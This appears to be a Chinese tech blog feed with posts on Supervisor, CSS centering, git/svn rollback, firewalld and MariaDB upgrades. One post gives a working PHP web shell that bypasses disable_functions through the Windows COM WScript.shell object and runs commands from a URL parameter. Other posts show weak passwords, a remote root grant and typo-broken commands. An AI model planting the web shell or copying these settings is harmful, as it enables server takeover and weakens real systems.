程序退出后自动重启,可选值：[unexpected,true,false]，默认为unexpected，表示进程意外杀死后才重启</span><br><span class="line">startretries=3       ; 启动失败自动重试次数，默认是3</span><br><span class="line">user=tomcat          ; 用哪个用户启动进程，默认是root</span><br><span class="line">priority=999         ; 进程启动优先级，默认999，值小的优先启动</span><br><span class="line">redirect_stderr=true ; 把stderr重定向到stdout，默认false</span><br><span class="line">stdout_logfile_maxbytes=20MB  ; stdout 日志文件大小，默认50MB</span><br><span class="line">stdout_logfile_backups = 20   ; stdout 日志文件备份数，默认是10</span><br><span class="line">; stdout 日志文件，需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录（supervisord 会自动创建日志文件）</span><br><span class="line">stdout_logfile=/opt/apache-tomcat-8.0.35/logs/catalina.out</span><br><span class="line">stopasgroup=false     ;默认为false,进程被杀死时，是否向这个进程组发送stop信号，包括子进程</span><br><span class="line">killasgroup=false     ;默认为false，向进程组发送kill信号，包括子进程</span><br><span class="line"></span><br><span class="line">;包含其它配置文件</span><br><span class="line">[include]</span><br><span class="line">files = relative/directory/*.ini    ;可以指定一个或多个以.ini结束的配置文件</span><br></pre></td></tr></table></figure>

<p>5、配置管理进程</p>
<p>进程管理配置参数，不建议全都写在supervisord.conf文件中，应该每个进程写一个配置文件放在include指定的目录下包含进supervisord.conf文件中。</p>
<p>1&gt; 创建/etc/supervisor/config.d目录，用于存放进程管理的配置文件</p>
<p>2&gt; 修改/etc/supervisor/supervisord.conf中的include参数，将/etc/supervisor/conf.d目录添加到include中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[include]</span><br><span class="line"></span><br><span class="line">files = /etc/supervisor/config.d/*.ini</span><br></pre></td></tr></table></figure>

<p><img src="/articles/Supervisor进行管理工具/0.png" alt="confg.d"></p>
<p>下面是配置Tomcat进程的一个例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[program:tomcat]</span><br><span class="line"></span><br><span class="line">command=/opt/apache-tomcat-8.0.35/bin/catalina.sh run</span><br><span class="line"></span><br><span class="line">stdout_logfile=/opt/apache-tomcat-8.0.35/logs/catalina.out</span><br><span class="line"></span><br><span class="line">autostart=true</span><br><span class="line"></span><br><span class="line">autorestart=true</span><br><span class="line"></span><br><span class="line">startsecs=5</span><br><span class="line"></span><br><span class="line">priority=1</span><br><span class="line"></span><br><span class="line">stopasgroup=true</span><br><span class="line"></span><br><span class="line">killasgroup=true</span><br></pre></td></tr></table></figure>

<p>5、启动Supervisor服务 <strong>supervisord -c /etc/supervisor/supervisord.conf</strong></p>
<p>6、控制进程</p>
<p>6.1 交互终端</p>
<p>supervisord启动成功后，可以通过supervisorctl客户端控制进程，启动、停止、重启。运行supervisorctl命令，不加参数，会进入supervisor客户端的交互终端，并会列出当前所管理的所有进程。</p>
<p><img src="/articles/Supervisor进行管理工具/1.png" alt="交互"></p>
<p>上图中的tomcat就是我们在配置文件中[program:tomcat]指定的名字。</p>
<p>输入help可以查看可以执行的命令列表，如果想看某个命令的作用，运行help 命令名称，如：help stop</p>
<p>stop tomcat  // 表示停止tomcat进程</p>
<p>stop all     // 表示停止所有进程</p>
<p>// …</p>
<p>6.2 bash终端</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">supervisorctl status</span><br><span class="line"></span><br><span class="line">supervisorctl stop tomcat</span><br><span class="line"></span><br><span class="line">supervisorctl start tomcat</span><br><span class="line"></span><br><span class="line">supervisorctl restart tomcat</span><br><span class="line"></span><br><span class="line">supervisorctl reread</span><br><span class="line"></span><br><span class="line">supervisorctl update</span><br></pre></td></tr></table></figure>

<p>6.3 Web管理界面</p>
<p><img src="/articles/Supervisor进行管理工具/2.png" alt="web"></p>
<p>出于安全考虑，默认配置是没有开启web管理界面，需要修改supervisord.conf配置文件打开http访权限，将下面的配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;[inet_http_server]         ; inet (TCP) server disabled by default</span><br><span class="line"></span><br><span class="line">;port=127.0.0.1:9001        ; (ip_address:port specifier, *:port for all iface)</span><br><span class="line"></span><br><span class="line">;username=user              ; (default is no username (open server))</span><br><span class="line"></span><br><span class="line">;password=123               ; (default is no password (open server))</span><br></pre></td></tr></table></figure>

<p>修改成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[inet_http_server]         ; inet (TCP) server disabled by default</span><br><span class="line"></span><br><span class="line">port=0.0.0.0:9001          ; (ip_address:port specifier, *:port for all iface)</span><br><span class="line"></span><br><span class="line">username=user              ; (default is no username (open server))</span><br><span class="line"></span><br><span class="line">password=123               ; (default is no password (open server))</span><br><span class="line"></span><br><span class="line">port：绑定访问IP和端口，这里是绑定的是本地IP和9001端口</span><br><span class="line"></span><br><span class="line">username：登录管理后台的用户名</span><br><span class="line"></span><br><span class="line">password：登录管理后台的密码</span><br></pre></td></tr></table></figure>

<p>7、开机启动Supervisor服务</p>
<p>7.1 配置systemctl服务</p>
<p>1&gt; 进入/lib/systemd/system目录，并创建supervisor.service文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line"></span><br><span class="line">Description=supervisor</span><br><span class="line"></span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line"></span><br><span class="line">Type=forking</span><br><span class="line"></span><br><span class="line">ExecStart=/usr/bin/supervisord -c /etc/supervisor/supervisord.conf</span><br><span class="line"></span><br><span class="line">ExecStop=/usr/bin/supervisorctl $OPTIONS shutdown</span><br><span class="line"></span><br><span class="line">ExecReload=/usr/bin/super  visorctl $OPTIONS reload</span><br><span class="line"></span><br><span class="line">KillMode=process</span><br><span class="line"></span><br><span class="line">Restart=on-failure</span><br><span class="line"></span><br><span class="line">RestartSec=42s</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line"></span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<p>2&gt; 设置开机启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable supervisor.service</span><br><span class="line"></span><br><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure>

<p>3、修改文件权限为766</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 766 supervisor.service</span><br></pre></td></tr></table></figure>

<p>7.2 配置service类型服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># supervisord   This scripts turns supervisord on</span><br><span class="line"></span><br><span class="line"># Author:       Mike McGrath &lt;mmcgrath@redhat.com&gt; (based off yumupdatesd)</span><br><span class="line"></span><br><span class="line"># chkconfig:    - 95 04</span><br><span class="line"></span><br><span class="line"># description:  supervisor is a process control utility.  It has a web based</span><br><span class="line"></span><br><span class="line">#               xmlrpc interface as well as a few other nifty features.</span><br><span class="line"></span><br><span class="line"># processname:  supervisord</span><br><span class="line"></span><br><span class="line"># config: /etc/supervisor/supervisord.conf</span><br><span class="line"></span><br><span class="line"># pidfile: /var/run/supervisord.pid</span><br><span class="line"></span><br><span class="line"># source function library</span><br><span class="line"></span><br><span class="line">. /etc/rc.d/init.d/functions</span><br><span class="line"></span><br><span class="line">RETVAL=0</span><br><span class="line"></span><br><span class="line">start() &#123;</span><br><span class="line">    echo -n $&quot;Starting supervisord: &quot;</span><br><span class="line">    daemon &quot;supervisord -c /etc/supervisor/supervisord.conf &quot;</span><br><span class="line">    RETVAL = $?</span><br><span class="line">    echo</span><br><span class="line">   [ $RETVAL -eq 0 ] &amp;&amp; touch /var/lock/subsys/supervisord</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop() &#123;</span><br><span class="line">    echo -n $&quot;Stopping supervisord: &quot;</span><br><span class="line">    kill proc supervisord</span><br><span class="line">    echo</span><br><span class="line">    [ $RETVAL -eq 0 ] &amp;&amp; rm -f /var/lock/subsys/supervisord</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">restart() &#123;</span><br><span class="line">    stop</span><br><span class="line">    start</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line">    start)</span><br><span class="line">        start</span><br><span class="line">    ;;</span><br><span class="line"></span><br><span class="line">    stop)</span><br><span class="line">        stop</span><br><span class="line">    ;;</span><br><span class="line"></span><br><span class="line">    restart|force-reload|reload)</span><br><span class="line">        restart</span><br><span class="line">    ;;</span><br><span class="line"></span><br><span class="line">    condrestart)</span><br><span class="line">        test -f /var/lock/subsys/supervisord  &amp;&amp; restart</span><br><span class="line">    ;;</span><br><span class="line"></span><br><span class="line">    status)</span><br><span class="line">        status supervisord</span><br><span class="line">        RETVAL=$?</span><br><span class="line">    ;;</span><br><span class="line"></span><br><span class="line">  *)</span><br><span class="line"></span><br><span class="line">    echo $&quot;Usage: $0 &#123;start|stop|status|restart|reload|force-reload|condrestart&#125;&quot;</span><br><span class="line"></span><br><span class="line">    exit 1</span><br><span class="line"></span><br><span class="line">esac</span><br><span class="line"></span><br><span class="line">    exit $RETVA</span><br></pre></td></tr></table></figure>

<p>将上述脚本内容保存到/etc/rc.d/init.d/supervisor文件中，修改文件权限为755，并设置开机启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 755 /etc/rc.d/init.d/supervisor</span><br><span class="line"></span><br><span class="line">chkconfig supervisor on</span><br></pre></td></tr></table></figure>

<p>注意：修改脚本中supervisor配置文件路径为你的supervisor的配置文件路径</p>
<p>其它Linux发行版开机启动脚本：<a href="https://github.com/Supervisor/initscripts" target="_blank" rel="noopener">https://github.com/Supervisor/initscripts</a></p>
<p><strong>注意：</strong></p>
<blockquote>
<p>Supervisor只能管理非daemon的进程，也就是说Supervisor不能管理守护进程。否则提示Exited too quickly (process log may have details)异常。例子中的Tomcat默认是以守护进程启动的，所以我们改成了catalina.sh run，以前台进程的方式运行。</p>
</blockquote>
<p>yum方式安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install epel-release</span><br><span class="line"></span><br><span class="line">yum install -y supervisor</span><br></pre></td></tr></table></figure>

<p>supervisor没有发布在标准的CentOS源在，需要安装epel源。这种方式安装的可能不是最新版本，但比较方便，安装完成之后，配置文件会自动帮你生成。</p>
<p>默认配置文件：/etc/supervisord.conf</p>
<p>进程管理配置文件放到：/etc/supervisord.d/目录下即可</p>
<p>默认日志文件：/tmp/supervisord.log，可以查看进程的启动信息</p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>css 如何使文字垂直居中</title>
    <url>/articles/css%20%E5%A6%82%E4%BD%95%E4%BD%BF%E6%96%87%E5%AD%97%E5%9E%82%E7%9B%B4%E5%B1%85%E4%B8%AD/</url>
    <content><![CDATA[<h4 id="单行文本"><a href="#单行文本" class="headerlink" title="单行文本"></a>单行文本</h4><p>单行文本只需要将文本行高(line-height)和所在区域高度(height)设为一致即可：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--html代码--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"div1"</span>&gt;</span></span><br><span class="line">    这是单行文本垂直居中</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">/*css代码*/</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-id">#div1</span> &#123;</span></span><br><span class="line">    width: 300px;</span><br><span class="line">    height: 100px;</span><br><span class="line">    margin: 50px auto;</span><br><span class="line">    border: 1px solid red;</span><br><span class="line"><span class="css">    <span class="selector-tag">line-height</span>: 100<span class="selector-tag">px</span>; <span class="comment">/*设置line-height与父级元素的height相等*/</span></span></span><br><span class="line"><span class="css">    <span class="selector-tag">text-align</span>: <span class="selector-tag">center</span>; <span class="comment">/*设置文本水平居中*/</span></span></span><br><span class="line"><span class="css">    <span class="selector-tag">overflow</span>: <span class="selector-tag">hidden</span>; <span class="comment">/*防止内容超出容器或者产生自动换行*/</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>显示结果:</p>
<div style="width: 300px;
    height: 100px;
    margin: 50px auto;
    border: 1px solid red;
    line-height: 100px; /*设置line-height与父级元素的height相等*/
    text-align: center; /*设置文本水平居中*/
    overflow: hidden; /*防止内容超出容器或者产生自动换行*/"> 这是单行文本垂直居中 </div>

<h4 id="多行文本"><a href="#多行文本" class="headerlink" title="多行文本"></a>多行文本</h4><p>多行文本垂直居中分为两种情况，一个是父级元素高度不固定，随着内容变化；另一个是父级元素高度固定。</p>
<p>父级高度不固定的时，高度只能通过内部文本来撑开。这样，我们可以通过设置内填充（padding）的值来使文本看起来垂直居中，只需设置padding-top和padding-bottom的值相等：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">&lt;!--html代码--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"div1"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    这是多行文本垂直居中，</span><br><span class="line"></span><br><span class="line">    这是多行文本垂直居中，</span><br><span class="line"></span><br><span class="line">    这是多行文本垂直居中，</span><br><span class="line"></span><br><span class="line">    这是多行文本垂直居中。</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">/*css代码*/</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-id">#div1</span>&#123;</span></span><br><span class="line">    width: 300px;</span><br><span class="line">    margin: 50px auto;</span><br><span class="line">    border: 1px solid red;</span><br><span class="line"><span class="css">    <span class="selector-tag">text-align</span>: <span class="selector-tag">center</span>; <span class="comment">/*设置文本水平居中*/</span></span></span><br><span class="line">    padding: 50px 20px;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>显示结果：</p>
<div style="width: 300px;
    margin: 50px auto;
    border: 1px solid red;
    text-align: center; /*设置文本水平居中*/
    padding: 50px 20px;">

<p>这是多行文本垂直居中，</p>
<p>这是多行文本垂直居中，</p>
<p>这是多行文本垂直居中，</p>
<p>这是多行文本垂直居中。</p>
</div>

<p>父级高度固定的时，设置父级div的display属性：display: table;；然后再添加一个div包含文本内容，设置其display:table-cell;和vertical-align:middle</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"outer"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"middle"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    这是固定高度多行文本垂直居中，</span><br><span class="line"></span><br><span class="line">    这是固定高度多行文本垂直居中，</span><br><span class="line"></span><br><span class="line">    这是固定高度多行文本垂直居中，</span><br><span class="line"></span><br><span class="line">    这是固定高度多行文本垂直居中。</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-id">#outer</span>&#123;</span></span><br><span class="line">    width: 400px;</span><br><span class="line">    height: 200px;</span><br><span class="line">    margin: 50px auto;</span><br><span class="line">    border: 1px solid red;</span><br><span class="line">    display: table;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="css"><span class="selector-id">#middle</span>&#123;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">display</span><span class="selector-pseudo">:table-cell</span>;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">vertical-align</span><span class="selector-pseudo">:middle</span>;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">text-align</span>: <span class="selector-tag">center</span>; <span class="comment">/*设置文本水平居中*/</span></span></span><br><span class="line"><span class="css">    <span class="selector-tag">width</span><span class="selector-pseudo">:100</span>%;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>显示结果:</p>
<div id="outer">
    <div id="middle">
这是固定高度多行文本垂直居中，

<p>这是固定高度多行文本垂直居中，</p>
<p>这是固定高度多行文本垂直居中，</p>
<p>这是固定高度多行文本垂直居中。<br>    </p></div><p></p>
</div>

<style>
#outer{
    width: 400px;
    height: 200px;
    margin: 50px auto;
    border: 1px solid red;
    display: table;
}

#middle{
    display:table-cell;
    vertical-align:middle;
    text-align: center; /*设置文本水平居中*/
    width:100%;
}
</style>
]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title>git、svn放弃本地更新</title>
    <url>/articles/git-svn%E6%94%BE%E5%BC%83%E6%9C%AC%E5%9C%B0%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<h4 id="GIT"><a href="#GIT" class="headerlink" title="GIT"></a>GIT</h4><p>1、只是下载远程的库的内容，不做任何的合并</p>
<p><code>git fetch --all</code></p>
<p>2、把HEAD指向刚刚下载的最新的版本</p>
<p><code>git reset --hard origin/master</code></p>
<h4 id="SVN"><a href="#SVN" class="headerlink" title="SVN"></a>SVN</h4><p>第一种情况：改动没有被提交（commit）。</p>
<p>这种情况下，使用svn</p>
<p>revert就能取消之前的修改。</p>
<p>svn revert用法如下：</p>
<p><code># svn revert [-R] something</code></p>
<p>其中something可以是（目录或文件的）相对路径也可以是绝对路径。</p>
<p>当something为单个文件时，直接svn revert something就行了；当something为目录时，需要加上参数-R(Recursive,递归)，否则只会将something这个目录的改动。</p>
<p>在这种情况下也可以使用svn update命令来取消对之前的修改，但不建议使用。因为svn update会去连接仓库服务器，耗费时间。</p>
<p>注意：svn revert本身有固有的危险，因为它的目的是放弃未提交的修改。一旦你选择了恢复，Subversion没有方法找回未提交的修改。</p>
<p>第二种情况：改动已经被提交（commit）。</p>
<p>这种情况下，用svn merge命令来进行回滚。</p>
<p>回滚的操作过程如下：</p>
<p>1、保证我们拿到的是最新代码：</p>
<p><code>svn update</code></p>
<p>假设最新版本号是28。</p>
<p>2、然后找出要回滚的确切版本号：</p>
<p><code>svn log [something]</code></p>
<p>假设根据svn log日志查出要回滚的版本号是25，此处的something可以是文件、目录或整个项目</p>
<p>如果想要更详细的了解情况，可以使用<code>svn diff -r 28:25 [something]</code></p>
<p>3、回滚到版本号25：</p>
<p><code>svn merge -r 28:25 something</code></p>
<p>为了保险起见，再次确认回滚的结果：</p>
<p><code>svn diff [something]</code></p>
<p>发现正确无误，提交。</p>
<p>4、提交回滚：</p>
<p><code>svn commit -m &quot;Revert revision from r28 to r25,because of ...&quot;</code></p>
<p>提交后版本变成了29。</p>
<p>将以上操作总结为三条如下：</p>
<ol>
<li><p>svn update，svn log，找到最新版本（latest revision）</p>
</li>
<li><p>找到自己想要回滚的版本号（rollbak revision）</p>
</li>
<li><p>用svn merge来回滚： svn merge -r : something</p>
</li>
</ol>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>linux端口检测</title>
    <url>/articles/linux%E7%AB%AF%E5%8F%A3%E6%A3%80%E6%B5%8B/</url>
    <content><![CDATA[<h4 id="永久开启端口"><a href="#永久开启端口" class="headerlink" title="永久开启端口"></a>永久开启端口</h4><p><code>firewall-cmd --add-port=3128/tcp --permanent</code></p>
<h4 id="查询端口是否开启"><a href="#查询端口是否开启" class="headerlink" title="查询端口是否开启"></a>查询端口是否开启</h4><p><code>firewall-cmd --query-port=3128/tcp</code></p>
<h4 id="启动firewall"><a href="#启动firewall" class="headerlink" title="启动firewall"></a>启动firewall</h4><p><code>systemctl start firewalld.service</code></p>
<h4 id="停止firewall"><a href="#停止firewall" class="headerlink" title="停止firewall"></a>停止firewall</h4><p><code>systemctl stop firewalld.service</code></p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>centos7 MariaDB 升级到最新版本</title>
    <url>/articles/centos7%20MariaDB%20%E5%8D%87%E7%BA%A7%E5%88%B0%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC/</url>
    <content><![CDATA[<p>1.创建/etc/yum.repos.d/MariaDB.repo文件， 下面以 10.0 版为例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[mariadb]</span><br><span class="line"></span><br><span class="line">name = MariaDB</span><br><span class="line"></span><br><span class="line">baseurl = http://yum.mariadb.org/10.0/centos6-amd64/</span><br><span class="line"></span><br><span class="line">gpgkey = https://yum.mariadb.org/RPM-GPG-KEY-MariaDB</span><br><span class="line"></span><br><span class="line">gpgcheck = 1</span><br></pre></td></tr></table></figure>

<p>2.关闭并卸载旧版本的mariadb，安装新版本的mariadb。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl stop mariadb</span><br><span class="line"></span><br><span class="line">yum remove mariadb-server mariadb mariadb-libs</span><br><span class="line"></span><br><span class="line">yum clean all</span><br><span class="line"></span><br><span class="line">yum install MariaDB-server MariaDB-client</span><br></pre></td></tr></table></figure>

<p>3.自定义数据目录和服务端口，移除默认的数据目录，创建新的数据目录。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm -rf /var/lib[mysql</span><br><span class="line"></span><br><span class="line">mkdir /var/data/db/mariadb</span><br></pre></td></tr></table></figure>

<p>4.修改配置文件/etc/my.cnf.d/mysql-clients.cnf，重点是[client]，其他的可以参考</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[client]</span><br><span class="line"></span><br><span class="line">port        = 3307</span><br><span class="line"></span><br><span class="line">socket      = /var/data/db/mariadb/mysql.sock</span><br><span class="line"></span><br><span class="line">[mysql]</span><br><span class="line"></span><br><span class="line">no-auto-rehash</span><br><span class="line"></span><br><span class="line">[mysqldump]</span><br><span class="line"></span><br><span class="line">quick</span><br><span class="line"></span><br><span class="line">max_allowed_packet = 64M</span><br><span class="line"></span><br><span class="line">[myisamchk]</span><br><span class="line"></span><br><span class="line">key_buffer_size = 128M</span><br><span class="line"></span><br><span class="line">sort_buffer_size = 128M</span><br><span class="line"></span><br><span class="line">read_buffer = 2M</span><br><span class="line"></span><br><span class="line">write_buffer = 2M</span><br><span class="line"></span><br><span class="line">[mysqlhotcopy]</span><br><span class="line"></span><br><span class="line">interactive-timeout</span><br></pre></td></tr></table></figure>

<p>5.修改配置文件/etc/my.cnf.d/server.cnf，这里的性能参数来自my-large.ini文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line"></span><br><span class="line">port            = 3307</span><br><span class="line"></span><br><span class="line">datadir         = /var/data/db/mariadb</span><br><span class="line"></span><br><span class="line">socket          = /var/data/db/mariadb/mysql.sock</span><br><span class="line"></span><br><span class="line">skip-external-locking</span><br><span class="line"></span><br><span class="line">key_buffer_size = 256M</span><br><span class="line"></span><br><span class="line">max_allowed_packet = 64M</span><br><span class="line"></span><br><span class="line">table_open_cache = 256</span><br><span class="line"></span><br><span class="line">sort_buffer_size = 1M</span><br><span class="line"></span><br><span class="line">read_buffer_size = 1M</span><br><span class="line"></span><br><span class="line">read_rnd_buffer_size = 4M</span><br><span class="line"></span><br><span class="line">myisam_sort_buffer_size = 64M</span><br><span class="line"></span><br><span class="line">thread_cache_size = 8</span><br><span class="line"></span><br><span class="line">query_cache_size= 16M</span><br><span class="line"></span><br><span class="line">thread_concurrency = 8</span><br><span class="line"></span><br><span class="line">log-bin=mysql-bin</span><br><span class="line"></span><br><span class="line">binlog_format=mixed</span><br><span class="line"></span><br><span class="line">server-id   = 1</span><br></pre></td></tr></table></figure>

<p>6.初始化数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql_install_db --defaults-file=/etc/my.cnf --datadir=/var/data/db/mariadb/ --user=mysql</span><br></pre></td></tr></table></figure>

<p>7.启动服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl restart mysql</span><br></pre></td></tr></table></figure>

<p>8.设置ROOT密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqladmin -u root password &quot;8888888&quot;</span><br></pre></td></tr></table></figure>

<p>9.登陆mysql</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure>

<p>10.授权root远程登录</p>
<p>root可从任何IP登陆，注意修改密码:’888888’</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt;GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;888888&apos; WITH GRANT OPTION;</span><br><span class="line"></span><br><span class="line">mysql&gt;FLUSH RIVILEGES;</span><br></pre></td></tr></table></figure>

<p>root可从指定IP登陆，注意修改密码:’888888’、IP:’192.168.1.188’</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt;GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;192.168.1.188&apos; IDENTIFIED BY &apos;888888&apos; WITH GRANT OPTION;</span><br><span class="line"></span><br><span class="line">mysql&gt;FLUSH RIVILEGES;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>WindowsCom组件绕过disable_function的方法</title>
    <url>/articles/WindowsCom%E7%BB%84%E4%BB%B6%E7%BB%95%E8%BF%87disable_function%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>window com组件(php 5.4)(高版本扩展要自己添加）</p>
<p>条件：要在php.ini中开启（如图）</p>
<p><img src="/articles/WindowsCom组件绕过disable_function的方法/psb.png" alt></p>
<p>利用代码，利用shell上传如下代码到目标服务器上</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$command=$_GET[<span class="string">'a'</span>];</span><br><span class="line"></span><br><span class="line">$wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>); <span class="comment">// 生成一个COM对象 Shell.Application也能</span></span><br><span class="line"></span><br><span class="line">$exec = $wsh-&gt;exec(<span class="string">"cmd /c "</span>.$command); <span class="comment">// 调用对象方法来执行命令</span></span><br><span class="line"></span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line"></span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $stroutput;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用成功后的结果</p>
<p><img src="/articles/WindowsCom组件绕过disable_function的方法/psb2.png" alt></p>
]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
  </entry>
  <entry>
    <title>layuiAdmin 专业版（单页面）开发者文档</title>
    <url>/articles/layuiAdmin-%E4%B8%93%E4%B8%9A%E7%89%88%EF%BC%88%E5%8D%95%E9%A1%B5%E9%9D%A2%EF%BC%89%E5%BC%80%E5%8F%91%E8%80%85%E6%96%87%E6%A1%A3/</url>
    <content><![CDATA[<p style="text-align:center">
    <a href="http://www.layui.com/admin/pro/" target="_blank" class="layui-btn">在线演示</a>
    <a href="https://www.layui.com/admin/" target="_blank" class="layui-btn">正版授权</a>
</p>

<blockquote>
<p>layuiAdmin pro （单页版）是完全基于 layui 架构而成的后台管理模板系统，可以更轻松地实现前后端分离，它是 mvc 的简化版，全面接管 视图 和 页面路由，并可自主完成数据渲染，服务端通常只负责数据接口，而前端只需专注视图和事件交互，所有的页面动作都是在一个宿主页面中完成，因此这赋予了 layuiAdmin 单页面应用开发的能力。</p>
</blockquote>
<h3 id="题外"><a href="#题外" class="headerlink" title="题外"></a>题外</h3><ul>
<li>该文档适用于 layuiAdmin 专业版（单页面），阅读之前请务必确认是否与你使用的版本对应。</li>
<li>熟练掌握 layuiAdmin 的前提是熟练掌握 layui，因此除了本篇文档， <a href="https://www.layui.com/doc/" target="_blank" rel="noopener">layui 的文档</a> 也是必不可少的存在。</li>
</ul>
<h3 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h3><h4 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h4><ul>
<li>解压文件后，将 layuiAdmin 完整放置在任意目录</li>
<li>通过本地 web 服务器去访问 ./start/index.html 即可运行 Demo</li>
</ul>
<blockquote>
<p>由于 layuiAdmin 可采用前后端分离开发模式，因此你无需将其放置在你的服务端 MVC 框架中，你只需要给 layuiAdmin 主入口页面（我们也称之为：宿主页面）进行访问解析，它即可全权完成自身路由的跳转和视图的呈现，而数据层则完全通过服务端提供的异步接口来完成。</p>
</blockquote>
<h4 id="目录说明"><a href="#目录说明" class="headerlink" title="目录说明"></a>目录说明</h4><ul>
<li><code>src/</code>: layuiAdmin 源代码，通常用于开发环境（如本地），推荐你在本地开发时，将 ./start/index.html 中的 layui.css 和 layui.js 的引入路径由 dist 改为 src 目录。<ul>
<li><code>src/controller/</code>：存放 JS 业务模块，即对视图进行事件等交互性处理</li>
<li><code>src/lib/</code>：layuiAdmin 的核心模块，一般不推荐修改</li>
<li><code>src/style/</code>：存放样式，其中 admin.css是核心样式</li>
<li><code>src/views/</code>：存放视图文件。其中 layout.html 是整个框架结构的承载，一般不推荐做大量改动。</li>
<li><code>src/config.js</code>：layuiAdmin 的全局配置文件，可随意修改。</li>
<li><code>src/index.js</code>：layuiAdmin 的入口模块，一般不推荐修改</li>
</ul>
</li>
